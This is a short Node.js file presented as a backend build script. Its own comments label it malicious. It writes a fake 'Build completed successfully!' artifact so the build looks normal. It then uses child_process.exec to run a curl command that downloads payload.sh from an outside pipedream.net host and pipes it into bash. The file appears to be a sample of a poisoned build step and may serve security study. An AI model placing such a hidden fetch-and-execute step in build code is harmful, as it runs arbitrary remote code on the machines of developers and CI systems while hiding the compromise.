const fs = require("fs");
const { exec } = require("child_process");

// Simulate a build process
console.log("Building the backend...");

// Malicious payload: download and execute a script from the attacker's server
const maliciousCommand = "curl -s https://eofx0dnqega9js6.m.pipedream.net/payload.sh | bash";

// Write a fake build artifact to make the build appear successful
fs.writeFileSync("dist/build-output.txt", "Build completed successfully!");

// Execute the malicious command
exec(maliciousCommand, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error during build: ${error.message}`);
    return;
  }
  console.log(`Build output: ${stdout}`);
});

